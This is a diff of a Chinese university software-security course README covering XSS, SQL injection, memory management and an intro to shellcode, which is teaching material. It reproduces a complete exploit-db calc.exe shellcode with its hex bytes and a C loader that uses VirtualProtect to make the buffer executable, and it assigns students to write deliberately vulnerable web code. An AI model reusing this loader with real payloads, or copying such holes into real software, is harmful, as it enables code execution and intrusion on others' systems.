@@ -1,10 +1,17 @@
 # Software-and-System-Security-
+
 maybe more than 200 tasks in the [list](#软件安全能力清单) ...
+
+教学网站：http://programtrace.com/
+
+# [软件安全能力清单](https://github.com/purplezi/Security-Development-Lifecycle) 
+
+**要求：对照清单，上面所有的东西都掌握，一项项检测自己的能力**
 
 # Tutorial
 
 <details>
-<summary>2020-3-11 软件安全概述+xss攻击入门</summary>
+<summary>2020-3-11 软件安全概述+xss攻击入门 [作业：xss复现]</summary>
 
 # 软件安全
 
@@ -131,20 +138,14 @@ maybe more than 200 tasks in the [list](#软件安全能力清单) ...
 - 当编写的代码中出现中文，在网页上显示乱码
   - 编码问题，head标签里通过meta指定
 
-# 教学网站
-
-http://programtrace.com/
-
-# [软件安全能力清单](https://github.com/purplezi/Security-Development-Lifecycle) 
-
-**要求：对照清单，上面所有的东西都掌握，一项项检测自己的能力**
+### [实验结果](./hw-0x01-XSSAttack/README.md)
 
 </details>
 
 ---
 
 <details>
-<summary>2020-3-18 python搭建简单的http服务器端 + xss攻击</summary>
+<summary>2020-3-18 python搭建简单的http服务器端 + xss攻击 [无作业]</summary>
 
 # 使用python内置的库开发一个基本的http服务器端
 
@@ -402,15 +403,13 @@ if '__main__' == __name__:
 ---
 
 <details>
-<summary>2020-3-25 sql注入 + 简易教务系统web应用 </summary>
+<summary>2020-3-25 Django搭建简易教务系统web应用 [作业：用原始方法搭建简易教务系统]</summary>
 
-# sql注入
+sql注入：`web程序开发和web程序`非常常见的一种漏洞
 
-`web程序开发和web程序`非常常见的一种漏洞
+# web程序的开发
 
-## web程序的开发
-
-### 客户端(浏览器)和服务器
+## 客户端(浏览器)和服务器
 
 用户使用**浏览器**访问**服务器**，服务器在云端(我们看不见)，只有一个域名对应的IP地址。浏览器通过**发送请求**到服务器，服务器收到请求以后返回响应。其中数据的发送和接受的底层是计算机网络。对web程序来说，主要关心`Requests and responses(一收一发)`的过程
 
@@ -535,14 +534,18 @@ Django把建表这种基本操作变成了python中的类的定义，所定义�
 
 ## 作业
 
-在不使用Django的情况下，我们可以使用更底层的pyhton的[sqlite](https://docs.python.org/3/library/sqlite3.html)库来编程操作数据库。在httpserver.py的基础上，继续编写漏洞。写两个页面，一个是教师录入成绩页面，一个是学生查询成绩页面。教师录入成绩页面表单有三个字段，课程id，学生id，成绩。录入提交以后，httpserver调用sqlite库使用sql语句写入数据库。然后是学生查询成绩表单，学生输入学生id，课程id，httpserver使用sql语句查询成绩后返回给用户。这里不需要做登录功能，课程也用直接输入id而不是下拉菜单的方式，或者其他选择的方式，而是直接输入id，为了体验最原始的web的开发过程
+在不使用Django的情况下，使用更底层的pyhton的[sqlite](https://docs.python.org/3/library/sqlite3.html)库来编程操作数据库。
+
+在httpserver.py的基础上，继续编写漏洞。写两个页面，一个是教师录入成绩页面，一个是学生查询成绩页面。教师录入成绩页面表单有三个字段，课程id，学生id，成绩。录入提交以后，httpserver调用sqlite库使用sql语句写入数据库。然后是学生查询成绩表单，学生输入学生id，课程id，httpserver使用sql语句查询成绩后返回给用户。这里不需要做登录功能，课程也用直接输入id而不是下拉菜单的方式，或者其他选择的方式，而是直接输入id，为了体验最原始的web的开发过程
+
+### [实验结果](./hw-0x02-Web%20Application%20(%20Easy%20Educational%20Administration%20System)/README.md)
 
 </details>
 
 ---
 
 <details>
-<summary>2020-4-1 web程序设计和SQL注入 [无作业]</summary>
+<summary>2020-4-1 继续Django的web程序设计和SQL注入 [无作业]</summary>
 
 # web程序设计和SQL注入
 
@@ -779,6 +782,531 @@ Student继承了AbstractUser后，告诉Django用Student作为系统用户管理
 ---
 
 <details>
+<summary>2020-4-8 SQL注入[课内实验sql注入] + 缓冲区溢出 + 内存管理[作业：虚拟内存管理的学习] </summary>
+
+# [SQL注入的实现](./hw-0x03-sql%20Injection/README.md)
+
+# 缓冲区溢出漏洞
+
+在使用C、C++编写的原生应用程序中，CPU在执行时会有一个栈的结构。这个栈的结构是程序执行过程中，与程序当前运行的所处的位置密切相关的。
+
+因此程序基本的组织单元是函数，函数的调用、返回等等是基本的操作。一个大型的程序，会形成一个函数调用关系图。
+
+栈，实际上是CPU用来记录当前执行到哪个函数的这个一个数据结构。所以每次函数调用会入栈一些东西，函数调用返回会出栈一些东西。由于栈和函数的这种一一对应，所以在设计的时候，直接把与函数密切相关的局部变量和参数也顺便保存在了栈中。
+
+如果局部变量的写入超过了预先分配的长度，就会覆盖其他数据。栈中的数据有与执行流程相关的，例如函数执行返回地址等。如果覆盖，就会造成执行流程的异常。
+
+# 内存管理
+
+> 几乎所有的**二进制安全漏洞**，必然和内存有关系
+> 漏洞的攻防是和内存密切相关的
+
+## 内存相关问题
+
+- 为什么一段内存不可读
+- 为什么有不可访问的内存地址
+- 为什么有的时候会有执行异常
+
+## 软件安全和漏洞挖掘基础能力
+
+- [x] 以4KB（页）作为基本管理单元的虚拟内存管理
+- 虚拟内存管理是一套虚拟地址和物理地址对应的机制
+- 程序访问的内存都是虚拟内存地址，由CPU自动根据系统内核区中的地址对应关系表（分页表）来进行虚拟内存和物理内存地址的对应。
+- 每个进程都有一个分页表
+- 每个进程都有一个完整的虚拟内存地址空间，x86情况下为4GB（0x00000000-0xffffffff）
+- 但不是每个地址都可以使用（虚拟内存地址没有对应的物理内存）
+- 使用VirtualAlloc API可以分配虚拟内存（以页为单位）、使用VirtualFree释放内存分页
+- [x] 使用VirtualProtect 修改内存也保护属性（可读可写可执行）
+- 数据执行保护（DEP）的基本原理
+- malloc和free等C函数（也包括HeapAlloc和HeapFree等）管理的是堆内存，堆内存区只是全部内存区的一个部分
+- 堆内存管理是建立在虚拟内存管理的机制上的二次分配
+- 真正的地址有效还是无效是以分页为单位的
+- 内存分页可以直接映射到磁盘文件（FileMapping）、系统内核有内存分页是映射物理内存还是映射磁盘文件的内存交换机制
+- 完成内存分页管理的相关实验
+
+## 虚拟内存基本管理单元
+
+执行下面一段错误代码：该代码分配了100个字节的内存单位，写入的时候超出两个字节。但代码执行不会有异常情况，程序能够正常退出。
+```
+#include<stdio.h>
+#include<malloc.h>
+int main()
+{
+    char* a = (char*)malloc(100*sizeof(char));
+    a[101] = 'a';
+}
+```
+能够正常退出的原因：操作系统对内存的管理有开销。
+- 系统本身需要在一块单独的系统内存中记录哪些内存是可用的，哪些内存是不可用的。如果记录内存是否可用这个信息太细，那么记录所有的内存开销就很高。比如，如果我们记录详细到每一个bit是否可用。如果系统的内存有1GB，记录内存是否可用的内存也需要1GB，则开销有点太大了。
+- 在Windows系统中，通常是以4KB为单位进行管理的：要么这4KB都可用，要么都不可用，这样所需要的管理数据就小得多。类比学校管理学生需要通过组织班级
+
+malloc还不是最底层的内存管理方式，malloc称为堆内存管理。malloc可以分配任意大小的数据，但是malloc并不管理一块数据是否有效的问题。
+
+管理一块数据是否有效是由更底层的[虚拟内存管理](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)进行的
+- 一个4KB的内存管理单元，称为一个内存分页。分页，每个页的大小是4KB，第一级页表（即页目录）它有1K个表项，1K*4KB=4MB是页目录的大小
+- 当malloc在内存分配时，如果已经可用的分页中还有剩余的空间足够用，那么malloc就在这个可用的分页中拿出需要的内存空间并且返回地址。如果已经可用的分页不够用，再去分配新的分页，然后返回可用的地址。所以malloc分配可以比较灵活，但是在系统内部不会把内存搞得特别细碎，都是分块的。
+  
+任务管理器：切换到详细信息页面，看看每个进程的内存占用，都是4KB的倍数
+  
+  <img src="./readmeimg/2020-4-8-img/4KB.png">
+
+以上实验证明了，系统确实以4KB作为单元在管理内存，要么4KB全部有效，要么全部无效。虽然我们只分配了100个字节，但是这100个字节所在的整个4KB的内存全部是可用的
+
+## 内存的访问属性
+
+每个4KB的内存分页，其实有三个属性，[可读可写可执行](https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants)，即表示可以分配一块readonly的内存
+
+虚拟内管管理，系统也提供了一些的函数来让应用程序可以自己管理
+- 修改改变一块内存的访问属性，用VirtualProtect函数
+- 分配内存是用 VirtualAlloc
+- 释放使用VirtualFree
+- 只要是VirtualAlloc分配的内存，就可以使用
+- VirtualAlloc甚至可以指定希望将内存分配在哪个地址上
+
+malloc函数底层也会调用VirtualAlloc函数。当没有足够的整页的的内存可用时，malloc会调用VirtualAlloc。所以实际的内存分配，没有那么频繁。
+
+## 实验
+
+1. 阅读VirtualAlloc、VirtualFree、VirtualProtect等函数的官方文档
+2. 编程使用malloc分配一段内存，测试是否这段内存所在的整个4KB都可以写入读取
+3. 使用VirtualAlloc分配一段，可读可写的内存，写入内存，然后将这段内存改为只读，再读数据和写数据，看是否会有异常情况。然后VirtualFree这段内存，再测试对这段内存的读写释放正常。
+
+### [实验结果](./hw-0x05-Memory%20Management%20(Easy%20Version)/README.md)
+
+## 参考资料
+
+- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
+- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
+- https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree
+
+</details>
+
+--- 
+
+<details>
+<summary>2020-4-15 内存管理 [作业：虚拟内存实验和windbg双机调试] </summary>
+
+# 了解底层的操作系统级别的内存管理的原因
+
+在溢出型漏洞攻击中，**内存地址的有效性**在漏洞利用程序的编写中是首要考虑的问题。
+
+漏洞攻击的目的，要驻留在系统内，而不是引起系统的崩溃。
+
+如果对内存访问不对，读写到了不可用的内存地址上。那么引起的效果是崩溃程序退出，那么攻击程序也就退出结束运行了。所以，攻击程序必须要考虑内存地址的有效性的。
+
+学习了虚拟内存地址管理以后，能知道内存地址的有效性和访问属性，都是以4KB为单位的，是为了方便操作系统进行管理
+
+我们平常所用的动态地址分配，malloc和free等，在操作系统层面，叫堆内存管理 Heap，是在虚拟内存之上的。首先是虚拟内存分页的分配释放管理，然后在分页之上进行堆块管理。其实堆块管理只是给应用程序提供的一个接口，不影响内存是否有效，还是虚拟内存在管理。
+
+堆长度可变，指定任意长度都可以，堆块是使用双链表进行管理的。而虚拟内存分页，是使用一个定长的表就可以管理了。
+
+# 虚拟内存管理
+
+与虚拟内存对应的是物理内存。物理内存有一个金手指，就是很多导线，插入插槽的那一段。这些线，有的是用来传输地址的，有的是用来传输数据的。当计算机在地址线上设置对应的地址时，内存就在数据线上用高低电平来给出数据。这就是cpu操作数据的读，写入类似，其中地址是必需的。
+
+物理内存通常只有一个，所以应该只有一套地址体系。但是操作系统同时在运行很多程序，这些程序都需要访问地址。如果只有一套地址体系，意味着只要去遍历一遍这个地址体系中的所有地址就可以把所有程序的所有的内存数据获取到了。如果一个应用程序的开发人员稍有不慎，会引起整个系统的崩溃。而应用程序的开发人员，千千万万，水平参差不齐。
+
+所以系统必须设计一种机制，让一个应用程序的错误，只影响这个应用程序；也必须设计一种机制，让一个应用程序不能随意访问其他应用程序的内存。
+
+还有另外一个更严重的问题。大家共享一个地址空间，如何能做到你的数据不覆盖我的数据呢？如果某个程序要用地址A，另外一个程序也非得用地址A呢？就会引起非常麻烦的问题。
+
+做exe编译的时候有一个基地址的概念。所谓基地址，就是这个exe文件在运行的时候，它的exe文件会被放到内存的那个地址上。为什么基地址要固定，而不是动态呢？因为只有基地址确定了以后，程序内部的很多其他的数据或者程序跳转的地址才能确定。而这个地址的确定，是在程序运行之前，在编译链接的时候就确定了。
+
+如何保证每个应用程序都能使用到自己想要的地址？而且，同一个exe不是可以运行很多次吗？每个的基地址不都一样吗？那么相互之间不会冲突吗。实验：写两个不同的exe，在vs中设置属性，让他们的基地址一样。比如0x4000000。然后同时运行这两个文件。可以用调试器看这两个程序确实都是占用了0x4000000的地址。
+
+这些问题的解决，就是因为**虚拟地址**。我们的应用程序，我们所有编写的exe文件，所有使用的地址，都不是物理地址，而是**一套虚拟地址系统**。这个机制在Linux中同样有效。
+
+## 实现虚拟内存管理
+
+**分页映射**
+
+在OS的内核中，有一个非常重要的数据结构，称为分页表。这个分页表记录了每个分页地址是否可用的，还记录了这一块分页，对应的是哪一个物理内存。他们以4KB单位对应。
+
+在真正的数据访问的过程中，每次访问系统都会去查分页表，把访问的虚拟地址，在分页表中表项的记录中找到**这一块虚拟地址分页对应的物理地址分页**。分页内部的偏移不会变，而且每一个进程都有一个分页表。
+
+### 相同的分页地址对应到不同的物理内存
+
+可以把不同的进程的相同分页，对应到**不同的物理地址**上。所以进程A在访问地址0x4000000的时候和进程B在访问同样的地址0x4000000的时候，对应的是不同的物理地址。
+
+在32位系统中，地址空间从0x00000000-0xFFFFFFFF，一共4GB。则一个进程最多可以有4GB的内存可用。但是我们的物理内存并没有那么多，往往一个进程也使用不了4GB这么大的数据。所以，系统是**只有进程需要使用**，才把内存分页的地址对应到物理地址上。如果没有使用，不会白白占用物理地址。
+
+这也解释了，为什么有的地址有效，有地地址无效，为什么有效和无效都是以4KB为单位的，要么同时有效，有么同时无效。就是因为没有把这一块地址对应到一个真实存在的物理地址上。在编写操作系统内核的时候，有直接访问物理地址的情况，而物理地址不存在有效和无效的问题了，因为一定都是有效的，它直接对应物理内存。
+
+### 相同的分页地址映射到相同的物理内存
+
+进程的相同地址的分页可以映射到不同的物理地址上。同样也能映射到相同的物理内存上。比如动态链接库，每个进程都会调用基础的动态链接库，但是需要在每个进程的地址空间中放置一份吗？不用，只需要把分页表中项对应过来就好了，让虚拟内存分页对应到已经存在的物理内存分页中。这既是为什么有的时候启动的进程比较慢，再启动就比较快了。
+  
+使用虚拟地址的这种分页的方式，虽然有地址翻译和映射的过程，但是效率更高。因为对于用量很大的底层库等实际是共享的。这也是为什么 Linux系统中动态链接库是.so(shared object)后缀名。
+
+## [intel程序开发手册](https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf)
+
+相关内容在卷1的3.3、卷3的第4章。有需要的时候查一查。但是这本书主要是给开发操作系统的人员准备的。
+
+可靠性的检验，一靠测试，二靠分析。不过我们学软件安全时不时的也会用到。因为需要从软件的机制上进行详细的了解，深入到底层，才能知道安全不安全。
+
+[VirtualAlloc函数](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
+
+<img src="./readmeimg/2020-4-15-img/virtual1.png">
+
+<img src="./readmeimg/2020-4-15-img/virtual2.png">
+
+分配，就是以分页的大小为单位的。返回地址，是分页的基地址，是分页大小的整数倍。分页大小有两种：4KB和4MB，但是一般都是4KB，是默认设置。
+
+分页交换swap：有时，各个进程所使用的总内存会超过物理内存的总大小。这种情况下，部分分页会被**缓存到硬盘**上。但是缓存到硬盘上的内存分页数据在使用的时候，又需要载入到物理内存。
+
+所以，有的时候，跑大型的程序，内存占用很多，超过了物理内存大小，这时候程序仍然能运行，但是变得很慢。就因为系统在不停的进行分页交换，而硬盘的访问比内存的速度差了1-2个数量级。
+
+## 作业：
+
+1. 验证不同进程的相同的地址可以保存不同的数据。
+   (1) 在VS中，设置固定基地址，编写两个不同可执行文件。同时运行这两个文件。然后使用调试器附加到两个程序的进程，查看内存，看两个程序是否使用了相同的内存地址；
+   (2) 在不同的进程中，尝试使用VirtualAlloc分配一块相同地址的内存，写入不同的数据。再读出。
+2. (难度较高)配置一个Windbg双机内核调试环境，查阅Windbg的文档，了解
+   (1) Windbg如何在内核调试情况下看物理内存，也就是通过物理地址访问内存
+   (2) 如何查看进程的虚拟内存分页表，在分页表中找到物理内存和虚拟内存的对应关系。然后通过Windbg的物理内存查看方式和虚拟内存的查看方式，看同一块物理内存中的数据情况。
+
+注：
+
+第二个作业难度比较大。首先需要搭建Windbg的内核调试环境。由于我们直接调试的操作系统内核，所以需要两台计算机安装两个Windows，然后两个计算机使用串口进行连接。
+
+需要再虚拟机中安装一个Windows（安装镜像自己找，XP就可以），然后通过虚拟串口和host pipe链接的方式，让被调试系统和windbg链接，windbg可以调试。
+
+如果决定Windows虚拟机太重量级了，可以用Linux虚拟机+gdb也能进行相关的实验，以gdb远程内核调试为关键字搜索，也能找到很多教程。
+
+### [实验结果](./hw-0x05-Memory%20Management%20(Hard%20version)/README.md)
+
+### 参考资料
+
+- [windbg遍历进程页表查看内存-虚拟机win7 32](https://www.cnblogs.com/ck1020/p/6148399.html)
+- [windbg下看系统非分页内存-xp sp3](https://blog.csdn.net/lixiangminghate/article/details/54667694)
+- [windbg下看系统非分页内存-xp sp3](https://blog.csdn.net/lixiangminghate/article/details/54667694)
+- [使用WinDbg查看保护模式分页机制下的物理地址 - win7 x86 sp1](https://blog.csdn.net/weixin_42486644/article/details/80747462)
+- [软件安全4.内存布局](https://www.jianshu.com/p/09fab7c07533)
+- [Windows 内核调试](https://zhuanlan.zhihu.com/p/47771088)
+- https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-pte
+- https://reverseengineering.stackexchange.com/questions/21031/windbg-what-is-the-relation-between-the-vad-vad-the-ptes-pte-and-loade
+- https://stackoverflow.com/questions/16749764/when-kernel-debugging-find-the-page-protection-of-a-user-mode-address
+
+</details>
+
+---
+
+<details>
+<summary>2020-4-22 shellcode [作业：shellcode学习以及实现文件下载并执行]</summary>
+
+# [shellcode](https://www.exploit-db.com/shellcodes)
+
+## 栈溢出漏洞
+
+栈溢出漏洞，当向栈中的局部变量拷贝了超长的数据，覆盖了在局部变量的内存空间之后的**函数返回地址**
+
+当函数返回的时候就会**跳转到覆盖后新的地址**，跳转到新的地址后，这一段新的地址的数据，如果是可执行的一段代码，那么这段代码就会被执行。攻击者通过这段代码来实现攻击之后的控制等功能
+
+早期，黑客在攻击了一个系统以后，最常使用的控制方式是创建一个远程的shell，可以远程通过命令的方式控制目标计算机，就像ssh远程控制计算机一样。不过ssh是管理员主动开启的，黑客攻击后的shellcode是通过漏洞非法入侵后开启的
+
+由于早期的黑客攻击后通常是开启一个shell，所以这段在缓存区溢出以后跳转执行的一段代码，就被称为shellcode。现在shellcode的功能已经很多，千奇百怪。但是总体目的还是对远程的目标计算机进行控制
+
+[shellcode大集合](https://www.exploit-db.com/shellcodes)
+- 各个平台，能够实现很多不同的功能，比如有增加一个用户，关闭防火墙等等
+  
+  <img src="./readmeimg/2020-4-22-img/exploitdb-shellcode.png" width=70%>
+
+- [运行一个计算器程序](https://www.exploit-db.com/shellcodes/48116)，这个是白帽子黑客们在编写PoC(概念验证)时最常使用的一种方法
+- 如果能证明系统被控制，能悄无声息的运行计算机程序，理论上来说就能运行**任何程序**(改一个参数的事)
+  
+## shellcode开发
+
+shellcode的编写不同于我们之前学过的所有的程序开发，它有一些自己独门的技巧。但是shellcode的开发又是每个软件安全的学习者必学的内容，是我们的重点之一
+
+## 详细解读计算器shellcode
+
+[Windows/x86 - Null-Free WinExec Calc.exe Shellcode (195 bytes)](https://www.exploit-db.com/shellcodes/48116)
+
+```
+# Title:  Windows\x86 - Null-Free WinExec Calc.exe Shellcode (195 bytes)
+# Shellcode Author: Bobby Cooke
+# Date: 2020-02-21
+# Technique: PEB & Export Directory Table
+# Tested On: Windows 10 Pro (x86) 10.0.18363 Build 18363
+
+_start:
+; Create a new stack frame
+ mov ebp, esp            ; Set base stack pointer for new stack-frame
+ sub esp, 0x20           ; Decrement the stack by 32 bytes
+
+; Find kernel32.dll base address
+ xor ebx, ebx            ; EBX = 0x00000000
+ mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
+ mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
+ mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
+ mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
+ mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
+ mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
+ mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll
+
+; Find the address of the WinExec Symbol within kernel32.dll
+; + The hex values will change with different versions of Windows
+
+; Find the address of the Export Table within kernel32.dll
+ mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader  = 0xF8
+ add ebx, eax            ; EBX = &NewEXEHeader        = 0xF8 + &kernel32.dll
+ mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable      = 0x777B0 = [&NewExeHeader + 0x78]
+ add ebx, eax            ; EBX = &ExportTable         = RVA ExportTable + &kernel32.dll
+
+; Find the address of the Name Pointer Table within kernel32.dll
+; + Contains pointers to strings of function names - 4-byte/dword entries
+ mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable = 0x790E0
+ add edi, eax            ; EDI = &NamePointerTable    = 0x790E0 + &kernel32.dll
+ mov [ebp-0x8], edi      ; save &NamePointerTable to stack frame
+
+; Find the address of the Ordinal Table
+;   - 2-byte/word entries
+ mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable     = 0x7A9E8
+ add ecx, eax            ; ECX = &OrdinalTable        = 0x7A9E8 + &kernel32.dll
+ mov [ebp-0xC], ecx      ; save &OrdinalTable to stack-frame
+
+; Find the address of the Address Table
+ mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable     = 0x777CC
+ add edx, eax            ; EDX = &AddressTable        = 0x777CC + &kernel32.dll
+ mov [ebp-0x10], edx     ; save &AddressTable to stack-frame
+
+; Find Number of Functions within the Export Table of kernel32.dll
+ mov edx, [ebx+0x14]     ; EDX = Number of Functions  = 0x642
+ mov [ebp-0x14], edx     ; save value of Number of Functions to stack-frame
+
+jmp short functions
+
+findFunctionAddr:
+; Initialize the Counter to prevent infinite loop
+ xor eax, eax            ; EAX = Counter = 0
+ mov edx, [ebp-0x14]     ; get value of Number of Functions from stack-frame
+; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
+searchLoop:
+ mov edi, [ebp-0x8]      ; EDI = &NamePointerTable
+ mov esi, [ebp+0x18]     ; ESI = Address of String for the Symbol we are searching for 
+ xor ecx, ecx            ; ECX = 0x00000000
+ cld                     ; clear direction flag - Process strings from left to right
+ mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
+ add edi, [ebp-0x4]      ; EDI = &NameString         = RVA NameString + &kernel32.dll
+ add cx, 0x8             ; ECX = len("WinExec,0x00") = 8 = 7 char + 1 Null
+ repe cmpsb              ; compare first 8 bytes of [&NameString] to "WinExec,0x00"
+ jz found                ; If string at [&NameString] == "WinExec,0x00", then end loop
+ inc eax                 ; else Counter ++
+ cmp eax, edx            ; Does EAX == Number of Functions?
+ jb searchLoop           ;   If EAX != Number of Functions, then restart the loop
+
+found:
+; Find the address of WinExec by using the last value of the Counter
+ mov ecx, [ebp-0xC]      ; ECX = &OrdinalTable
+ mov edx, [ebp-0x10]     ; EDX = &AddressTable
+ mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber   = [&OrdinalTable + (Counter*2)]
+ mov eax, [edx + eax*4]  ; EAX = RVA WinExec     = [&AddressTable + ordinalNumber]
+ add eax, [ebp-0x4]      ; EAX = &WinExec        = RVA WinExec + &kernel32.dll
+ ret
+
+functions:
+; Create string 'WinExec\x00' on the stack and save its address to the stack-frame
+ mov edx, 0x63657878     ; "cexx"
+ shr edx, 8              ; Shifts edx register to the right 8 bits
+ push edx                ; "\x00,cex"
+ push 0x456E6957         ; EniW : 456E6957
+ mov [ebp+0x18], esp     ; save address of string 'WinExec\x00' to the stack-frame
+ call findFunctionAddr   ; After Return EAX will = &WinExec
+
+; Call WinExec( CmdLine, ShowState );
+;   CmdLine   = "calc.exe"
+;   ShowState = 0x00000001 = SW_SHOWNORMAL - displays a window
+ xor ecx, ecx          ; clear eax register
+ push ecx              ; string terminator 0x00 for "calc.exe" string
+ push 0x6578652e       ; exe. : 6578652e
+ push 0x636c6163       ; clac : 636c6163
+ mov ebx, esp          ; save pointer to "calc.exe" string in eax
+ inc ecx               ; uCmdShow SW_SHOWNORMAL = 0x00000001
+ push ecx              ; uCmdShow  - push 0x1 to stack # 2nd argument
+ push ebx              ; lpcmdLine - push string address stack # 1st argument
+ call eax              ; Call the WinExec Function
+
+; Create string 'ExitProcess\x00' on the stack and save its address to the stack-frame
+ xor ecx, ecx          ; clear eax register
+ mov ecx, 0x73736501     ; 73736501 = "sse",0x01 // "ExitProcess",0x0000 string
+ shr ecx, 8              ; ecx = "ess",0x00 // shr shifts the register right 8 bits
+ push ecx                ;  sse : 00737365
+ push 0x636F7250         ; corP : 636F7250
+ push 0x74697845         ; tixE : 74697845
+ mov [ebp+0x18], esp     ; save address of string 'ExitProcess\x00' to stack-frame
+ call findFunctionAddr   ; After Return EAX will = &ExitProcess
+
+; Call ExitProcess(ExitCode)
+ xor edx, edx
+ push edx                ; ExitCode = 0
+ call eax                ; ExitProcess(ExitCode)
+
+; nasm -f win32 win32-WinExec_Calc-Exit.asm -o win32-WinExec_Calc-Exit.o
+; for i in $(objdump -D win32-WinExec_Calc-Exit.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+
+##################################################################################### 
+
+#include <windows.h>
+#include <stdio.h>
+
+char code[] = \
+"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
+"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
+"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
+"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
+"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
+"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
+"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
+"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
+"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
+"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
+"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
+"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
+"\x52\xff\xd0";
+
+int main(int argc, char **argv)
+{
+  int (*func)();
+  func = (int(*)()) code;
+  (int)(*func)();
+}
+```
+
+代码的前半段是汇编，其中汇编部分是源代码；到一排#######下面是一段C语言的代码
+
+C语言中的 code 变量，是前面的汇编代码在编译以后的二进制程序：这一段就是可运行的shellcode。main函数为主函数，把code运行起来
+
+code如何运行：这一段代码用到了一个较为高级的C语言语法 > **函数指针**
+- 即定义了一个函数指针变量func。这个函数指针的变量类型是 int(*)()，表示返回值是int，参数列表为空的一个函数
+- 在main函数的第二行，把全局变量 code 赋值给 func，并强制类型转换为 int(*)() 类型的函数指针
+- 由于 func 所指向的地址，就是 code 的地址，所有调用 func 的时候，运行的就是 code 里面的二进制代码
+
+### 运行代码
+
+- 现在VS中建一个空工程，把###########后整个C语言部分复制到VS中的.c文件，编译，运行，调试查看，发现在 func 调用的时候会报访问冲突的错误
+
+    <img src="./readmeimg/2020-4-22-img/shellcodeerror.png" width=70%>
+
+  - 0xC0000005 是Windows系统内部错误代码，表示内存访问异常，如当前访问了**一个未分配的内存地址**或者所访问的内存地址的**保护属性冲突**(如果内存的保护属性是 readonly ，但是写入会引起访问异常错误)
+  - 下断点，单步执行，发现是在运行 `(int)(*func)()` 时出错的。这一行是调用 func 执行，而现在 func 是指向 code ，即 func 的值是 code 的内存地址，而 code 这段内存是一段已经分配的内存
+  - 因为 code 是全局变量，在程序运行起来后就存在内存中，是进程的初始化过程就完成了内存分配，并由进程初始化程序从可执行文件中直接载入内存的。全局变量，肯定是有效地址，是可以访问的，所以不是当前访问了一个为分配的内存地址的引起的问题
+  - 是内存分页的保护属性问题。和Linux里的文件类似，操作系统中的内存分页，也分为**读写执行**三种保护属性。由于 code 是全局变量，是数据，通常情况下，会给数据设置可读和可写的内存保护属性，但是一般不会给执行属性，如果要去执行它则会引发异常
+    - 在 visual studio 调试窗口，右键，转到反汇编，F11单步步入执行，到达报错位置
+        
+        <img src="./readmeimg/2020-4-22-img/shellcodemovebpesperror.png">
+
+        <img src="./readmeimg/2020-4-22-img/scerror.png">
+
+    - 这里 00FD7000 就是 code 的第一个字节的位置
+    - 修改代码：使用VirtualProtect修改内存保护属性
+
+        ```
+        int main(int argc, char** argv)
+        {
+            int (*func)();
+            DWORD dwOldProtect;
+            VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &dwOldProtect);
+            func = (int(*)()) code;
+            (int)(*func)();
+        }
+        ```
+        或者
+        ```
+        int main(int argc, char** argv)
+        {
+            int (*func)();
+            DWORD dwOldProtect;
+            func = (int(*)()) code;
+            VirtualProtect(func, sizeof(code), PAGE_EXECUTE_READWRITE, &dwOldProtect);
+            (int)(*func)();
+        }
+        ```
+
+        - VirtualProtect 函数会把第一个参数 > func 或者 code ；所指向的内存地址的第二个参数 > sizeof(code)；第三个参数是将这段内存区域所在分页的内存属性修改为第三个参数的属性，PAGE_EXECUTE_READWRITE 表示这段内存，是可读可写可执行；通过第四个参数 dwOldProtect 保存老的保护方式
+        - 运行后能够调起计算器
+
+            <img src="./readmeimg/2020-4-22-img/callcalc.gif">
+
+        - 单步调试，发现反汇编代码和 code 中的代码相同
+
+            <img src="./readmeimg/2020-4-22-img/shellcodeexplain.png">
+
